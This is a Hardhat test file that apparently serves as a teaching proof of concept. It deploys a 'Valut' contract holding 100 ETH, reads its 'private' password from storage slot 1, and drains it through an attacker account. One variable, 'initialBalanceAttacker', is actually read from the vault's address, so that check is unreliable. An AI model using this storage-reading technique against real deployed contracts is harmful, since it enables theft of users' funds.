const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Valut", function () {
  let deployer, attacker;

  beforeEach(async function() {
    [deployer, attacker] = await ethers.getSigners();

    const Valut = await ethers.getContractFactory("Valut", deployer);
    this.valut = await Valut.deploy(ethers.utils.formatBytes32String("myPassword"));

    await this.valut.deposit({value: ethers.utils.parseEther("100")});
  });

  it("Should be possible to access to its private variables", async function() {

    let initialBalanceAttacker = await ethers.provider.getBalance(this.valut.address);

    let password = await ethers.provider.getStorageAt(this.valut.address, 1);
    await this.valut.connect(attacker).withdraw(password);

    let finalBalanceContract = await ethers.provider.getBalance(this.valut.address);
    let finalBalanceAttacker = await ethers.provider.getBalance(attacker.address);

    expect(finalBalanceContract).to.eq(0);
    expect(finalBalanceAttacker).to.be.gt(initialBalanceAttacker);
  })
});
